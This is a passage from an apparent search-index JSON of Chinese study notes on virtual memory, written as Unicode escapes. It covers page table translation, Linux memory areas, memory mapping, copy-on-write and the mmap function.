\u200b\u8be5\u200b\u6761\u76ee\u200b\u5b58\u50a8\u200b\u4e86\u200b\u5305\u542b\u200b\u8be5\u200b\u865a\u62df\u200b\u9875\u200b\u7684\u200b\u4e8c\u7ea7\u200b\u9875\u8868\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b. \u200b\u518d\u7528\u200b \\(va[9:17]\\) \u200b\u627e\u5230\u200b\u5305\u542b\u200b\u8be5\u200b\u865a\u62df\u200b\u9875\u200b\u7684\u200b\u4e09\u7ea7\u200b\u9875\u8868\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b, \u200b\u518d\u7528\u200b \\(va[18:26]\\) \u200b\u627e\u5230\u200b\u5305\u542b\u200b\u8be5\u200b\u865a\u62df\u200b\u9875\u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u7ea7\u200b\u9875\u8868\u200b\u7684\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b, \u200b\u518d\u7528\u200b \\(va[27:35]\\) \u200b\u5b9a\u4f4d\u200b\u5230\u200b\u6700\u540e\u200b\u4e00\u7ea7\u200b\u9875\u8868\u200b\u7684\u200b\u6761\u76ee\u200b, \u200b\u5b83\u200b\u5305\u542b\u200b\u4e86\u200b PPN. \u200b\u6700\u540e\u200b\u52a0\u4e0a\u200b \\(val[36:47]\\) \u200b\u7684\u200b VPO \u200b\u7ec4\u6210\u200b\u7269\u7406\u5730\u5740\u200b PA</p> <p></p> <p></p> <p>Hint</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u505a\u200b\u4e00\u4e9b\u200b 9.6.4 \u200b\u8282\u200b\u6216\u8005\u200b\u5bb6\u5ead\u4f5c\u4e1a\u200b\u4e2d\u200b\u7684\u200b\u524d\u200b\u51e0\u9898\u200b, \u200b\u4f60\u200b\u5c31\u200b\u4f1a\u200b\u53d1\u73b0\u200b PPN \u200b\u4e0e\u200b Cache \u200b\u7684\u200b\u6807\u5fd7\u200b\u4f4d\u200b\u603b\u662f\u200b\u4e00\u6837\u200b\u7684\u200b, \u200b\u8fd9\u200b\u6b63\u662f\u200b\u8bbe\u8ba1\u200b\u7684\u200b\u65f6\u5019\u200b\u505a\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u7cbe\u7ec6\u200b\u8ba1\u7b97\u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b, \u200b\u8fd9\u6837\u200b VPO \u200b\u5bf9\u5e94\u200b\u540e\u9762\u200b\u7684\u200b block \u200b\u548c\u200b set \u200b\u4f4d\u200b, PPN \u200b\u5bf9\u5e94\u200b\u524d\u9762\u200b\u7684\u200b tag \u200b\u4f4d\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4e00\u8fb9\u200b\u7ffb\u8bd1\u200b\u7684\u200b\u65f6\u5019\u200b\u4e00\u8fb9\u200b\u5728\u200b L1 Cache \u200b\u4e2d\u200b\u67e5\u627e\u200b.</p>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#972-linux","title":"9.7.2 Linux \u200b\u865a\u62df\u5185\u5b58\u200b\u7cfb\u7edf","text":"<p>Linux \u200b\u4e3a\u200b\u6bcf\u4e2a\u200b\u8fdb\u7a0b\u200b\u7ef4\u62a4\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5355\u72ec\u200b\u7684\u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b, \u200b\u5982\u4e0a\u56fe\u200b. \u200b\u5185\u6838\u200b\u865a\u62df\u5185\u5b58\u200b\u5305\u62ec\u200b\u5185\u6838\u200b\u4e2d\u200b\u7684\u200b\u4ee3\u7801\u200b\u548c\u200b\u6570\u636e\u7ed3\u6784\u200b. \u200b\u5b83\u4eec\u200b\u4e2d\u200b\u7684\u200b\u67d0\u4e9b\u200b\u533a\u57df\u200b\u88ab\u200b\u6620\u5c04\u200b\u5230\u200b\u6240\u6709\u200b\u8fdb\u7a0b\u200b\u5171\u4eab\u200b\u7684\u200b\u7269\u7406\u200b\u9875\u9762\u200b, \u200b\u4f8b\u5982\u200b, \u200b\u6bcf\u4e2a\u200b\u8fdb\u7a0b\u200b\u5171\u4eab\u200b\u5185\u6838\u200b\u7684\u200b\u4ee3\u7801\u200b\u548c\u200b\u5168\u5c40\u200b\u6570\u636e\u7ed3\u6784\u200b. </p> <p>\u200b\u6709\u8da3\u200b\u7684\u200b\u662f\u200b, Linux \u200b\u4e5f\u200b\u5c06\u200b \u200b\u5185\u6838\u200b\u4e2d\u200b \u200b\u4e00\u7ec4\u200b\u8fde\u7eed\u200b\u7684\u200b\u865a\u62df\u200b\u9875\u9762\u200b(\u200b\u5927\u5c0f\u200b\u7b49\u4e8e\u200b\u7cfb\u7edf\u200b\u4e2d\u200b DRAM) \u200b\u6620\u5c04\u200b\u5230\u200b\u76f8\u5e94\u200b\u7684\u200b\u4e00\u7ec4\u200b\u8fde\u7eed\u200b\u7684\u200b\u7269\u7406\u200b\u9875\u9762\u200b, \u200b\u8fd9\u6837\u200b\u5185\u6838\u200b\u60f3\u8981\u200b\u8bbf\u95ee\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u53ea\u200b\u9700\u8981\u200b\u901a\u8fc7\u200b\u865a\u62df\u5730\u5740\u200b\u52a0\u4e0a\u200b\u56fa\u5b9a\u200b\u7684\u200b\u504f\u79fb\u91cf\u200b, \u200b\u800c\u200b\u4e0d\u7528\u200b\u8fdb\u884c\u200b\u590d\u6742\u200b\u7684\u200b\u5730\u5740\u200b\u7ffb\u8bd1\u200b. \u200b\u8fd9\u4e9b\u200b\u865a\u62df\u200b\u9875\u9762\u200b\u4e0e\u200b\u666e\u901a\u200b\u7684\u200b\u865a\u62df\u200b\u9875\u9762\u200b\u4e0d\u592a\u200b\u4e00\u6837\u200b, \u200b\u4f60\u200b\u53ef\u4ee5\u200b\u628a\u200b\u5b83\u4eec\u200b\u7406\u89e3\u200b\u4e3a\u200b\u4e00\u4e9b\u200b\u7528\u4e8e\u200b\u8bbf\u95ee\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u7684\u200b\u57fa\u5740\u200b.</p> <p>\u200b\u8fd9\u7ec4\u200b\u8fde\u7eed\u200b\u7684\u200b\u865a\u62df\u200b\u9875\u9762\u200b\u5927\u5c0f\u200b\u7b49\u4e8e\u200b\u7cfb\u7edf\u200b\u4e2d\u200b DRAM, \u200b\u5c82\u200b\u4e0d\u662f\u200b\u4f1a\u200b\u5360\u7528\u200b\u5f88\u591a\u200b\u9875\u8868\u200b\u9879\u200b?</p> <p>\u200b\u5982\u679c\u200b\u8fd8\u662f\u200b\u7528\u200b 4KB \u200b\u4f5c\u4e3a\u200b\u4e00\u9875\u200b\u7684\u8bdd\u200b, \u200b\u786e\u5b9e\u200b\u4f1a\u200b\u5360\u7528\u200b\u5f88\u591a\u200b\u9875\u8868\u200b\u9879\u200b, \u200b\u4f8b\u5982\u200b, \u200b\u7cfb\u7edf\u200b\u5185\u5b58\u200b\u4e3a\u200b 16GB, \u200b\u5c31\u200b\u9700\u8981\u200b 16GB/4KB=4M \u200b\u4e2a\u200b\u9875\u8868\u200b\u9879\u200b. \u200b\u4f46\u662f\u200b\u56e0\u4e3a\u200b\u5b83\u4eec\u200b\u975e\u5e38\u200b\u8fde\u7eed\u200b, \u200b\u6240\u4ee5\u200b\u5176\u5b9e\u200b\u5185\u6838\u200b\u4f1a\u200b\u4f7f\u7528\u200b\u5927\u9875\u200b\u6765\u200b\u5927\u5e45\u200b\u51cf\u5c11\u200b\u9875\u8868\u200b\u9879\u200b\u6570\u91cf\u200b, \u200b\u6bd4\u5982\u200b 2MB \u200b\u751a\u81f3\u200b 1GB, \u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ea\u200b\u9700\u8981\u200b\u5f88\u5c11\u200b\u7684\u200b\u9875\u8868\u200b\u9879\u200b\u4e86\u200b.</p> <p>\u200b\u5185\u6838\u200b\u865a\u62df\u5185\u5b58\u200b\u7684\u200b\u5176\u4ed6\u200b\u533a\u57df\u200b\u5305\u542b\u200b\u6bcf\u4e2a\u200b\u8fdb\u7a0b\u200b\u90fd\u200b\u4e0d\u200b\u76f8\u540c\u200b\u7684\u200b\u6570\u636e\u200b. \u200b\u4f8b\u5982\u200b, \u200b\u9875\u8868\u200b, \u200b\u5185\u6838\u200b\u5728\u200b\u8fdb\u7a0b\u200b\u4e0a\u4e0b\u6587\u200b\u4e2d\u200b\u6267\u884c\u200b\u4ee3\u7801\u200b\u4f7f\u7528\u200b\u7684\u200b\u6808\u200b, \u200b\u4e00\u7ea7\u200b\u8bb0\u5f55\u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b\u5f53\u524d\u200b\u7ec4\u7ec7\u200b\u7684\u200b\u5404\u79cd\u200b\u6570\u636e\u7ed3\u6784\u200b.</p> <p>1. Linux \u200b\u865a\u62df\u5185\u5b58\u200b\u533a\u57df\u200b</p> <p>Linux \u200b\u5c06\u200b\u865a\u62df\u5185\u5b58\u200b\u7ec4\u7ec7\u200b\u6210\u200b\u4e00\u4e9b\u200b\u533a\u57df\u200b(\u200b\u4e5f\u200b\u53eb\u505a\u200b\u6bb5\u200b)\u200b\u7684\u200b\u96c6\u5408\u200b. \u200b\u4e00\u4e2a\u200b\u533a\u57df\u200b\u5c31\u662f\u200b\u5df2\u7ecf\u200b\u5b58\u5728\u200b\u7740\u200b\u7684\u200b (\u200b\u5df2\u200b\u5206\u914d\u200b\u7684\u200b) \u200b\u865a\u62df\u5185\u5b58\u200b\u7684\u200b\u8fde\u7eed\u200b\u7247\u200b, \u200b\u8fd9\u4e9b\u200b\u9875\u200b\u662f\u200b\u4ee5\u200b\u67d0\u79cd\u200b\u65b9\u5f0f\u200b\u76f8\u5173\u8054\u200b\u7684\u200b. \u200b\u4f8b\u5982\u200b, \u200b\u4ee3\u7801\u6bb5\u200b, \u200b\u6570\u636e\u200b\u6bb5\u200b, \u200b\u5806\u200b, \u200b\u5171\u4eab\u200b\u5e93\u6bb5\u200b, \u200b\u7528\u6237\u200b\u6808\u200b\u90fd\u200b\u662f\u200b\u4e0d\u540c\u200b\u7684\u200b\u533a\u57df\u200b. \u200b\u6bcf\u4e2a\u200b\u5b58\u5728\u200b\u7684\u200b\u865a\u62df\u200b\u9875\u9762\u200b\u90fd\u200b\u4fdd\u5b58\u200b\u5728\u200b\u67d0\u4e2a\u200b\u533a\u57df\u200b\u4e2d\u200b.</p> <p>\u200b\u4e0b\u56fe\u200b\u5f3a\u8c03\u200b\u4e86\u200b\u8bb0\u5f55\u200b\u4e00\u4e2a\u200b\u8fdb\u7a0b\u200b\u4e2d\u200b\u865a\u62df\u5185\u5b58\u200b\u533a\u57df\u200b\u7684\u200b\u5185\u6838\u200b\u6570\u636e\u7ed3\u6784\u200b. \u200b\u5185\u6838\u200b\u4e3a\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u8fdb\u7a0b\u200b\u7ef4\u62a4\u200b\u4e00\u4e2a\u200b\u5355\u72ec\u200b\u7684\u200b\u4efb\u52a1\u200b\u7ed3\u6784\u200b (task_struct). \u200b\u4efb\u52a1\u200b\u7ed3\u6784\u200b\u4e2d\u200b\u7684\u200b\u5143\u7d20\u200b\u5305\u542b\u200b\u6216\u8005\u200b\u6307\u5411\u200b\u5185\u6838\u200b\u8fd0\u884c\u200b\u8be5\u200b\u8fdb\u7a0b\u200b\u6240\u200b\u9700\u8981\u200b\u7684\u200b\u6240\u6709\u200b\u4fe1\u606f\u200b (PID, \u200b\u6307\u5411\u200b\u7528\u6237\u200b\u6808\u200b\u7684\u200b\u6307\u9488\u200b, \u200b\u53ef\u200b\u6267\u884c\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b\u540d\u5b57\u200b, \u200b\u7a0b\u5e8f\u200b\u8ba1\u6570\u5668\u200b\u7b49\u200b). \u200b\u901a\u8fc7\u200b\u4fdd\u5b58\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b, \u200b\u5185\u6838\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5207\u6362\u200b\u4e0a\u4e0b\u6587\u200b\u7684\u200b\u65f6\u5019\u200b\u6062\u590d\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u72b6\u6001\u200b.  \u200b\u4efb\u52a1\u200b\u7ed3\u6784\u200b\u4e2d\u200b\u7684\u200b\u4e00\u4e2a\u200b\u6761\u76ee\u200b\u6307\u5411\u200b mm_struct, \u200b\u5b83\u200b\u63cf\u8ff0\u200b\u4e86\u200b\u865a\u62df\u5185\u5b58\u200b\u7684\u200b\u5f53\u524d\u200b\u72b6\u6001\u200b. \u200b\u5176\u4e2d\u200b pgd \u200b\u6307\u5411\u200b\u7b2c\u4e00\u7ea7\u200b\u9875\u8868\u200b(\u200b\u9875\u200b\u5168\u5c40\u200b\u76ee\u5f55\u200b)\u200b\u7684\u200b\u57fa\u5740\u200b, mmap \u200b\u6307\u5411\u200b\u4e00\u4e2a\u200b vm_area_structs (\u200b\u533a\u57df\u200b\u7ed3\u6784\u200b) \u200b\u7684\u200b\u94fe\u8868\u200b. \u200b\u6bcf\u4e2a\u200b vm_area_structs \u200b\u90fd\u200b\u63cf\u8ff0\u200b\u4e86\u200b\u5f53\u524d\u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b\u7684\u200b\u4e00\u4e2a\u200b\u533a\u57df\u200b. \u200b\u5f53\u200b\u5185\u6838\u200b\u8fd0\u884c\u200b\u8fd9\u4e2a\u200b\u8fdb\u7a0b\u200b\u65f6\u200b, \u200b\u5c31\u200b\u628a\u200b pgd \u200b\u5b58\u653e\u200b\u5728\u200b CR3 \u200b\u63a7\u5236\u200b\u5bc4\u5b58\u5668\u200b\u4e2d\u200b.</p> <p>\u200b\u4e00\u4e2a\u200b\u5177\u4f53\u200b\u533a\u57df\u200b\u7684\u200b\u533a\u57df\u200b\u7ed3\u6784\u200b\u5305\u542b\u200b\u4e0b\u9762\u200b\u7684\u200b\u5b57\u200b\u6bb5\u200b:</p> <ul> <li>vm_start: \u200b\u6307\u5411\u200b\u8fd9\u4e2a\u200b\u533a\u57df\u200b\u8d77\u59cb\u200b\u5904\u200b</li> <li>vm_end: \u200b\u6307\u5411\u200b\u8fd9\u4e2a\u200b\u533a\u57df\u200b\u7ed3\u675f\u200b\u5904\u200b</li> <li>vm_prot: \u200b\u63cf\u8ff0\u200b\u8fd9\u4e2a\u200b\u533a\u57df\u200b\u5185\u200b\u5305\u542b\u200b\u7684\u200b\u6240\u6709\u200b\u9875\u200b\u7684\u200b\u8bfb\u5199\u200b\u8bb8\u53ef\u200b\u6743\u9650\u200b.</li> <li>vm_flags: \u200b\u63cf\u8ff0\u200b\u8fd9\u4e2a\u200b\u533a\u57df\u200b\u5185\u200b\u7684\u200b\u9875\u9762\u200b\u662f\u200b\u4e0e\u200b\u5176\u4ed6\u200b\u8fdb\u7a0b\u200b\u5171\u4eab\u200b\u7684\u200b, \u200b\u8fd8\u662f\u200b\u8fd9\u4e2a\u200b\u8fdb\u7a0b\u200b\u79c1\u6709\u200b\u7684\u200b(\u200b\u8fd8\u200b\u63cf\u8ff0\u200b\u4e86\u200b\u5176\u4ed6\u200b\u4e00\u4e9b\u200b\u4fe1\u606f\u200b)</li> <li>vm_next: \u200b\u6307\u5411\u200b\u94fe\u8868\u200b\u4e2d\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u533a\u57df\u200b\u7ed3\u6784\u200b.</li> </ul> <p>2. Linux \u200b\u7f3a\u9875\u200b\u5f02\u5e38\u200b\u5904\u7406\u200b </p>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#98","title":"9.8 \u200b\u5185\u5b58\u200b\u6620\u5c04","text":"<p>Linux \u200b\u901a\u8fc7\u200b\u5c06\u200b\u4e00\u4e2a\u200b\u865a\u62df\u5185\u5b58\u200b\u533a\u57df\u200b\u4e0e\u200b\u4e00\u4e2a\u200b\u78c1\u76d8\u200b\u4e0a\u200b\u7684\u200b\u5bf9\u8c61\u200b\u5173\u8054\u200b\u8d77\u6765\u200b, \u200b\u4ee5\u200b\u521d\u59cb\u5316\u200b\u8fd9\u4e2a\u200b\u865a\u62df\u5185\u5b58\u200b\u533a\u57df\u200b\u7684\u200b\u5185\u5bb9\u200b, \u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u79f0\u4e3a\u200b\u5185\u5b58\u200b\u6620\u5c04\u200b. \u200b\u865a\u62df\u5185\u5b58\u200b\u533a\u57df\u200b\u53ef\u4ee5\u200b\u6620\u5c04\u200b\u5230\u200b\u4e24\u79cd\u200b\u7c7b\u578b\u200b\u7684\u200b\u5bf9\u8c61\u200b\u4e2d\u200b\u7684\u200b\u4e00\u79cd\u200b:</p> <p>1) Linux \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e2d\u200b\u7684\u200b\u666e\u901a\u200b\u6587\u4ef6\u200b. \u200b\u4e00\u4e2a\u200b\u533a\u57df\u200b\u53ef\u4ee5\u200b\u6620\u5c04\u200b\u5230\u200b\u4e00\u4e2a\u200b\u666e\u901a\u200b\u78c1\u76d8\u200b\u6587\u4ef6\u200b\u7684\u200b\u8fde\u7eed\u200b\u90e8\u5206\u200b, \u200b\u4f8b\u5982\u200b\u4e00\u4e2a\u200b\u53ef\u200b\u6267\u884c\u200b\u76ee\u6807\u200b\u6587\u4ef6\u200b. \u200b\u6587\u4ef6\u200b\u533a\u200b\u88ab\u200b\u5206\u4e3a\u200b\u9875\u200b\u5927\u5c0f\u200b\u7684\u200b\u7247\u200b, \u200b\u6bcf\u200b\u4e00\u7247\u200b\u5305\u542b\u200b\u4e00\u4e2a\u200b\u865a\u62df\u200b\u9875\u9762\u200b\u7684\u200b\u521d\u59cb\u200b\u5185\u5bb9\u200b. \u200b\u5982\u679c\u200b\u533a\u57df\u200b\u6bd4\u200b\u6587\u4ef6\u200b\u533a\u200b\u8fd8\u8981\u200b\u5927\u200b, \u200b\u5c31\u200b\u7528\u200b 0 \u200b\u6765\u200b\u586b\u5145\u200b. 2) \u200b\u533f\u540d\u200b\u6587\u4ef6\u200b: \u200b\u4e00\u4e2a\u200b\u533a\u57df\u200b\u53ef\u4ee5\u200b\u6620\u5c04\u200b\u5230\u200b\u4e00\u4e2a\u200b\u533f\u540d\u200b\u6587\u4ef6\u200b, \u200b\u533f\u540d\u200b\u6587\u4ef6\u200b\u662f\u200b\u7531\u200b\u5185\u6838\u200b\u521b\u5efa\u200b\u7684\u200b, \u200b\u5305\u542b\u200b\u7684\u200b\u5168\u662f\u200b\u4e8c\u8fdb\u5236\u200b0. CPU \u200b\u7b2c\u4e00\u6b21\u200b\u5f15\u7528\u200b\u8fd9\u6837\u200b\u4e00\u4e2a\u200b\u533a\u57df\u200b\u5185\u200b\u7684\u200b\u865a\u62df\u200b\u9875\u9762\u200b\u65f6\u200b, \u200b\u5185\u6838\u200b\u5c31\u200b\u5728\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u4e2d\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u5408\u9002\u200b\u7684\u200b\u727a\u7272\u200b\u9875\u9762\u200b, \u200b\u5982\u679c\u200b\u8be5\u200b\u9875\u9762\u200b\u88ab\u200b\u4fee\u6539\u200b\u8fc7\u200b, \u200b\u5c31\u200b\u5c06\u200b\u8fd9\u4e2a\u200b\u9875\u9762\u200b\u6362\u200b\u51fa\u200b, \u200b\u7528\u200b\u4e8c\u8fdb\u5236\u200b 0 \u200b\u8986\u76d6\u200b\u727a\u7272\u200b\u9875\u9762\u200b\u5e76\u200b\u66f4\u65b0\u200b\u9875\u8868\u200b.</p>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#981","title":"9.8.1 \u200b\u518d\u200b\u770b\u200b\u5171\u4eab\u200b\u5bf9\u8c61","text":"<p>\u200b\u8bb8\u591a\u200b\u8fdb\u7a0b\u200b\u7531\u200b\u540c\u6837\u200b\u7684\u200b\u53ea\u8bfb\u200b\u4ee3\u7801\u200b\u533a\u57df\u200b, \u200b\u5185\u5b58\u200b\u6620\u5c04\u200b\u7ed9\u200b\u6211\u4eec\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u79cd\u200b\u6e05\u6670\u200b\u7684\u200b\u673a\u5236\u200b, \u200b\u7528\u6765\u200b\u63a7\u5236\u200b\u591a\u4e2a\u200b\u8fdb\u7a0b\u200b\u5982\u4f55\u200b\u5171\u4eab\u200b\u5bf9\u8c61\u200b.</p> <p>\u200b\u4e00\u4e2a\u200b\u5bf9\u8c61\u200b\u53ef\u4ee5\u200b\u88ab\u200b\u6620\u5c04\u200b\u5230\u200b\u865a\u62df\u5185\u5b58\u200b\u7684\u200b\u4e00\u4e2a\u200b\u533a\u57df\u200b, \u200b\u8981\u4e48\u200b\u4f5c\u4e3a\u200b\u5171\u4eab\u200b\u5bf9\u8c61\u200b, \u200b\u8981\u4e48\u200b\u4f5c\u4e3a\u200b\u79c1\u6709\u200b\u5bf9\u8c61\u200b. \u200b\u5982\u679c\u200b\u4e00\u4e2a\u200b\u8fdb\u7a0b\u200b\u5c06\u200b\u4e00\u4e2a\u200b\u5171\u4eab\u200b\u5bf9\u8c61\u200b\u6620\u5c04\u200b\u5230\u200b\u5b83\u200b\u7684\u200b\u865a\u62df\u5730\u5740\u200b\u7a7a\u95f4\u200b\u7684\u200b\u4e00\u4e2a\u200b\u533a\u57df\u200b\u5185\u200b, \u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b\u8fdb\u7a0b\u200b\u5bf9\u200b\u8fd9\u4e2a\u200b\u533a\u57df\u200b\u7684\u200b\u4efb\u4f55\u200b\u5199\u200b\u64cd\u4f5c\u200b, \u200b\u5bf9\u200b\u5176\u4ed6\u200b\u4e5f\u200b\u628a\u200b\u8fd9\u4e2a\u200b\u5171\u4eab\u200b\u5bf9\u8c61\u200b\u6620\u5c04\u200b\u5230\u200b\u5b83\u4eec\u200b\u865a\u62df\u5185\u5b58\u200b\u7684\u200b\u5176\u4ed6\u200b\u8fdb\u7a0b\u200b\u800c\u8a00\u200b, \u200b\u4e5f\u200b\u662f\u200b\u53ef\u89c1\u200b\u7684\u200b. \u200b\u800c\u4e14\u200b\u8fd9\u4e9b\u200b\u53d8\u5316\u200b\u4e5f\u200b\u4f1a\u200b\u53cd\u6620\u200b\u5728\u200b\u78c1\u76d8\u200b\u4e0a\u200b\u7684\u200b\u539f\u59cb\u200b\u5bf9\u8c61\u200b\u4e2d\u200b.</p> <p>\u200b\u5bf9\u200b\u4e00\u4e2a\u200b\u6620\u5c04\u200b\u5230\u200b\u79c1\u6709\u200b\u5bf9\u8c61\u200b\u7684\u200b\u533a\u57df\u200b\u505a\u200b\u7684\u200b\u6539\u53d8\u200b, \u200b\u5bf9\u4e8e\u200b\u5176\u4ed6\u200b\u8fdb\u7a0b\u200b\u6765\u8bf4\u200b\u662f\u200b\u4e0d\u200b\u53ef\u89c1\u200b\u7684\u200b, \u200b\u5e76\u4e14\u200b\u8fdb\u7a0b\u200b\u5bf9\u200b\u8fd9\u4e2a\u200b\u533a\u57df\u200b\u6240\u200b\u505a\u200b\u7684\u200b\u4efb\u4f55\u200b\u5199\u200b\u64cd\u4f5c\u200b\u90fd\u200b\u4e0d\u4f1a\u200b\u53cd\u6620\u200b\u5728\u200b\u78c1\u76d8\u200b\u4e0a\u200b\u7684\u200b\u5bf9\u8c61\u200b\u4e2d\u200b.</p> <p>\u200b\u79c1\u6709\u200b\u5bf9\u8c61\u200b\u4f7f\u7528\u200b\u4e00\u79cd\u200b\u53eb\u505a\u200b\u5199\u65f6\u200b\u590d\u5236\u200b\u7684\u200b\u5de7\u5999\u200b\u6280\u672f\u200b\u6620\u5c04\u200b\u5230\u200b\u865a\u62df\u5185\u5b58\u200b\u4e2d\u200b. \u200b\u4e0b\u56fe\u200b\u5c55\u793a\u200b\u4e86\u200b\u4e00\u79cd\u200b\u60c5\u51b5\u200b, \u200b\u4e24\u4e2a\u200b\u8fdb\u7a0b\u200b\u5c06\u200b\u4e00\u4e2a\u200b\u56db\u6709\u200b\u5bf9\u8c61\u200b\u6620\u5c04\u200b\u5230\u200b\u865a\u62df\u5185\u5b58\u200b\u7684\u200b\u4e0d\u540c\u200b\u533a\u57df\u200b, \u200b\u4f46\u662f\u200b\u5171\u4eab\u200b\u8fd9\u4e2a\u200b\u5bf9\u8c61\u200b\u540c\u4e00\u4e2a\u200b\u7269\u7406\u200b\u526f\u672c\u200b. \u200b\u5bf9\u4e8e\u200b\u6bcf\u4e2a\u200b\u6620\u5c04\u200b\u79c1\u6709\u200b\u5bf9\u8c61\u200b\u7684\u200b\u8fdb\u7a0b\u200b, \u200b\u76f8\u5e94\u200b\u79c1\u6709\u200b\u533a\u57df\u200b\u7684\u200b\u9875\u8868\u200b\u6761\u76ee\u200b\u90fd\u200b\u88ab\u200b\u6807\u8bb0\u200b\u4e3a\u200b\u53ea\u8bfb\u200b. \u200b\u53ea\u8981\u200b\u6ca1\u6709\u200b\u8fdb\u7a0b\u200b\u8bd5\u56fe\u200b\u5199\u200b\u5b83\u200b\u81ea\u5df1\u200b\u7684\u200b\u79c1\u6709\u200b\u533a\u57df\u200b, \u200b\u5b83\u4eec\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u200b\u5171\u4eab\u200b. \u200b\u7136\u800c\u200b\u53ea\u8981\u200b\u6709\u200b\u4e00\u4e2a\u200b\u8fdb\u7a0b\u200b\u8bd5\u56fe\u200b\u5199\u200b\u79c1\u6709\u200b\u533a\u57df\u200b\u7684\u200b\u67d0\u4e2a\u200b\u9875\u9762\u200b, \u200b\u8fd9\u4e2a\u200b\u5199\u200b\u64cd\u4f5c\u200b\u5c31\u200b\u4f1a\u200b\u89e6\u53d1\u200b\u4e00\u4e2a\u200b\u4fdd\u62a4\u200b\u6545\u969c\u200b.</p> <p>\u200b\u5f53\u200b\u6545\u969c\u200b\u5904\u7406\u7a0b\u5e8f\u200b\u6ce8\u610f\u200b\u5230\u200b\u4fdd\u62a4\u200b\u5f02\u5e38\u200b\u662f\u200b\u7531\u4e8e\u200b\u8fdb\u7a0b\u200b\u8bd5\u56fe\u200b\u5199\u200b\u79c1\u6709\u200b\u7684\u200b\u5199\u200b\u65f6\u200b\u590d\u5236\u200b\u533a\u57df\u200b\u4e2d\u200b\u7684\u200b\u4e00\u4e2a\u200b\u9875\u9762\u200b\u800c\u200b\u5f15\u8d77\u200b\u7684\u200b\uff0c\u200b\u5b83\u200b\u5c31\u200b\u4f1a\u200b\u5728\u200b\u7269\u7406\u200b\u5185\u5b58\u200b\u4e2d\u200b\u521b\u5efa\u200b\u8fd9\u4e2a\u200b\u9875\u9762\u200b\u7684\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u526f\u672c\u200b\uff0c\u200b\u66f4\u65b0\u200b\u9875\u8868\u200b\u6761\u76ee\u200b\u6307\u5411\u200b\u8fd9\u4e2a\u200b\u65b0\u200b\u7684\u200b\u526f\u672c\u200b\uff0c\u200b\u7136\u540e\u200b\u6062\u590d\u200b\u8fd9\u4e2a\u200b\u9875\u9762\u200b\u7684\u200b\u53ef\u200b\u5199\u200b\u6743\u9650\u200b\uff0c\u200b\u5982\u56fe\u200b9-30b\u200b\u6240\u793a\u200b\u3002\u200b\u5f53\u200b\u6545\u969c\u200b\u5904\u7406\u7a0b\u5e8f\u200b\u8fd4\u56de\u200b\u65f6\u200b\uff0cCPU\u200b\u91cd\u65b0\u200b\u6267\u884c\u200b\u8fd9\u4e2a\u200b\u5199\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u73b0\u5728\u200b\u5728\u200b\u65b0\u521b\u5efa\u200b\u7684\u200b\u9875\u9762\u200b\u4e0a\u200b\u8fd9\u4e2a\u200b\u5199\u200b\u64cd\u4f5c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u6267\u884c\u200b\u4e86\u200b\u3002 </p>"},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#982-fork","title":"9.8.2 \u200b\u518d\u200b\u770b\u200b fork","text":""},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#983-execve","title":"9.8.3 \u200b\u518d\u200b\u770b\u200b execve","text":""},{"location":"notes/ICS/Chapter%2009%20Virtual%20Memory/#984-mmap","title":"9.8.4 \u200b\u4f7f\u7528\u200b mmap \u200b\u51fd\u6570\u200b\u7684\u200b\u7528\u6237\u200b\u7ea7\u200b\u5185\u5b58\u200b\u6620\u5c04","text":"<p>Linux \u200b\u8fdb\u7a0b\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b mmap \u200b\u51fd\u6570\u200b\u521b\u5efa\u200b\u65b0\u200b\u7684\u200b\u865a\u62df\u5185\u5b58\u200b\u533a\u57df\u200b, \u200b\u5e76\u200b\u5c06\u200b\u5bf9\u8c61\u200b\u6620\u5c04\u200b\u5230\u200b\u8fd9\u4e9b\u200b\u533a\u57df\u200b\u4e2d\u200b.</p> <p> </p> <p>\u200b\u53c2\u6570\u200b prot \u200b\u63cf\u8ff0\u200b\u65b0\u200b\u6620\u5c04\u200b\u7684\u200b\u865a\u62df\u5185\u5b58\u200b\u533a\u57df\u200b\u7684\u200b\u8bbf\u95ee\u200b\u6743\u9650\u200b\u4f4d\u200b:</p> <ul> <li>PROT_EXEC: \u200b\u8fd9\u4e2a\u200b\u533a\u57df\u200b\u5185\u200b\u7684\u200b\u9875\u9762\u200b\u7531\u200b\u53ef\u4ee5\u200b\u88ab\u200b CPU 